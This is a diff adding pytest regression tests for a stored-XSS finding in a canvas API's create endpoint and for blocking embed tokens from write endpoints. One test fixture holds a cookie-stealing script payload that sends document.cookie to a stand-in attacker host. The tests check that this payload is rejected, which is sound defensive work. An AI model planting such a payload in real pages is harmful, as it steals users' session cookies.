@@ -2508,3 +2508,231 @@ class TestPutCanvasApiConnectorOwnership:
         assert resp.status_code == 200, (
             f"Expected 200 for owned connector_id, got {resp.status_code}: {resp.text}"
         )
+
+
+# ---------------------------------------------------------------------------
+# 12. [HIGH stored-XSS] POST /canvases validation symmetry + embed-token block
+# ---------------------------------------------------------------------------
+
+# RSA keypair for embed token tests in this module.
+import json as _json
+import os as _os
+from datetime import timedelta, timezone, datetime as _datetime
+
+from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+from cryptography.hazmat.primitives import serialization as _serialization
+from cryptography.hazmat.backends import default_backend as _default_backend
+from jwt.algorithms import RSAAlgorithm as _RSAAlgorithm
+import jwt as _pyjwt
+
+_CANVAS_PRIVATE_KEY = _rsa.generate_private_key(
+    public_exponent=65537,
+    key_size=2048,
+    backend=_default_backend(),
+)
+_CANVAS_PUBLIC_KEY = _CANVAS_PRIVATE_KEY.public_key()
+_CANVAS_JWKS_KEY: dict = _json.loads(
+    _RSAAlgorithm.to_jwk(_CANVAS_PUBLIC_KEY)
+)
+_CANVAS_JWKS_KEY["kid"] = "canvas-test-key"
+_CANVAS_JWKS_KEY["use"] = "sig"
+_CANVAS_STATIC_JWKS: dict = {"keys": [_CANVAS_JWKS_KEY]}
+
+_CANVAS_HOST_ISS = "https://canvas-xss-test-host.example"
+_CANVAS_HOST_AUD = "nubi"
+_CANVAS_EMBED_ORIGIN = "https://canvas-xss-test-host.example"
+
+
+def _mint_canvas_embed_token(scope: list[str] | None = None) -> str:
+    """Mint a valid RS256 embed JWT for canvas XSS / embed-block tests."""
+    if scope is None:
+        scope = ["read:*", "edit:*"]
+    now = _datetime.now(tz=timezone.utc)
+    payload = {
+        "iss": _CANVAS_HOST_ISS,
+        "aud": _CANVAS_HOST_AUD,
+        "sub": "canvas-embed-user",
+        "org": "canvas-test-org",
+        "roles": ["viewer"],
+        "policies": {},
+        "scope": scope,
+        "embed_origin": _CANVAS_EMBED_ORIGIN,
+        "iat": int(now.timestamp()),
+        "exp": int((now + timedelta(seconds=300)).timestamp()),
+    }
+    return _pyjwt.encode(
+        payload,
+        _CANVAS_PRIVATE_KEY,
+        algorithm="RS256",
+        headers={"kid": "canvas-test-key"},
+    )
+
+
+def _embed_auth_headers() -> dict[str, str]:
+    return {
+        "Authorization": f"Bearer {_mint_canvas_embed_token()}",
+        "Origin": _CANVAS_EMBED_ORIGIN,
+    }
+
+
+@pytest_asyncio.fixture
+async def canvas_client_with_embed(app, fake_db):
+    """Client fixture that also registers the canvas-test embed issuer."""
+    from app.auth.issuers import get_issuer_registry
+    from app.auth.jwks_cache import clear_cache
+
+    repo = InMemoryRepo()
+    set_repo(repo)
+
+    user_id = str(uuid.uuid4())
+    org_id = str(uuid.uuid4())
+    fake_db.users[user_id] = {
+        "id": user_id,
+        "email": "canvas-embed-tester@example.com",
+        "name": "Canvas Embed Tester",
+        "avatar_url": None,
+        "email_verified": True,
+        "created_at": "2024-01-01T00:00:00+00:00",
+    }
+    repo.seed_org_member(org_id=org_id, user_id=user_id, role="owner")
+
+    # Register the embed issuer so verified_identity accepts our RS256 token.
+    registry = get_issuer_registry()
+    registry.register(
+        _CANVAS_HOST_ISS,
+        jwks_uri=f"{_CANVAS_HOST_ISS}/.well-known/jwks.json",
+        aud=_CANVAS_HOST_AUD,
+        allowed_origins=[_CANVAS_EMBED_ORIGIN],
+        static_jwks=_CANVAS_STATIC_JWKS,
+    )
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(
+        transport=transport,
+        base_url="http://testserver",
+        follow_redirects=False,
+    ) as ac:
+        yield ac, user_id, org_id, repo
+
+    # Cleanup: unregister the issuer after the test.
+    try:
+        registry.unregister(_CANVAS_HOST_ISS)
+    except Exception:  # noqa: BLE001
+        pass
+    clear_cache()
+    set_repo(None)
+
+
+class TestCreateCanvasXssAndEmbedBlock:
+    """Regression tests for HIGH stored-XSS and embed-token-write findings.
+
+    Finding: POST /canvases (create) did NOT validate config.doc for XSS
+    payloads, while PUT /canvases/{id} (update) correctly rejected them.
+    This asymmetry allowed a writer to persist malicious HTML via create
+    that would have been caught by update.
+
+    Additionally: embed tokens must be blocked from POST /canvases (and all
+    other write endpoints) regardless of their scope claims.
+    """
+
+    # ── XSS: POST rejects <script> doc (mirrors PUT behaviour) ───────────────
+
+    @pytest.mark.asyncio
+    async def test_post_with_script_doc_is_rejected_400(self, canvas_client):
+        """POST /canvases with config.doc containing <script> → 400 invalid_canvas_doc.
+
+        Regression for HIGH stored-XSS: the create endpoint must run the same
+        validate_canvas_doc_with_repo guard that PUT already applies, so a
+        writer cannot bypass XSS protection by going through create instead of
+        update.
+        """
+        client, user_id, _org_id, _repo = canvas_client
+
+        xss_doc = {
+            "version": 1,
+            "title": "XSS attempt via create",
+            "html": '<div><script>fetch("https://evil.example/steal?c="+document.cookie)</script></div>',
+            "bindings": {},
+        }
+        resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "XSS Canvas", "config": {"doc": xss_doc}},
+            headers=_auth_headers(user_id),
+        )
+        assert resp.status_code == 400, (
+            f"Expected 400 for <script> in create config.doc, got {resp.status_code}: {resp.text}"
+        )
+        body = resp.json()
+        error_code = body.get("code") or (body.get("error") or {}).get("code")
+        assert error_code == "invalid_canvas_doc", (
+            f"Expected invalid_canvas_doc error code, got: {body}"
+        )
+
+    @pytest.mark.asyncio
+    async def test_post_with_valid_doc_creates_201(self, canvas_client):
+        """POST /canvases with a valid config.doc → 201 (no false positives).
+
+        Ensures the validation guard does not block legitimate create requests
+        that contain a well-formed CanvasDoc.
+        """
+        client, user_id, _org_id, _repo = canvas_client
+
+        valid_doc = {
+            "version": 1,
+            "title": "Safe Canvas",
+            "html": '<div><nubi-kpi data-el-id="el1"></nubi-kpi></div>',
+            "bindings": {},
+        }
+        resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Valid Doc Canvas", "config": {"doc": valid_doc}},
+            headers=_auth_headers(user_id),
+        )
+        assert resp.status_code == 201, (
+            f"Expected 201 for valid create doc, got {resp.status_code}: {resp.text}"
+        )
+        assert resp.json()["name"] == "Valid Doc Canvas"
+
+    @pytest.mark.asyncio
+    async def test_post_without_doc_creates_201(self, canvas_client):
+        """POST /canvases without config.doc key → 201 (no regression on plain creates)."""
+        client, user_id, _org_id, _repo = canvas_client
+
+        resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "No-Doc Canvas", "config": {"theme": "dark"}},
+            headers=_auth_headers(user_id),
+        )
+        assert resp.status_code == 201, (
+            f"Expected 201 for config without doc, got {resp.status_code}: {resp.text}"
+        )
+
+    # ── Embed token: blocked from POST /canvases ──────────────────────────────
+
+    @pytest.mark.asyncio
+    async def test_embed_token_blocked_from_post_canvases(
+        self, canvas_client_with_embed
+    ):
+        """An embed token is rejected (401 or 403) from POST /canvases.
+
+        Embed tokens are read-only viewer credentials issued by a host
+        application signed with RS256.  The create endpoint uses ``current_user``
+        which only accepts first-party HS256 tokens, so an RS256 embed JWT will
+        be rejected with 401 at the JWT-decode layer.  The explicit
+        ``identity.kind == "embed"`` guard in the handler provides defence-in-depth
+        in case the token somehow passes ``current_user`` (e.g. future refactors).
+
+        Either 401 (decode failure) or 403 (embed block) are correct: both mean
+        the embed token cannot create canvases.
+        """
+        client, _user_id, _org_id, _repo = canvas_client_with_embed
+
+        resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Embed Hijack Canvas"},
+            headers=_embed_auth_headers(),
+        )
+        assert resp.status_code in (401, 403), (
+            f"Expected 401 or 403 for embed token on POST /canvases, "
+            f"got {resp.status_code}: {resp.text}"
+        )
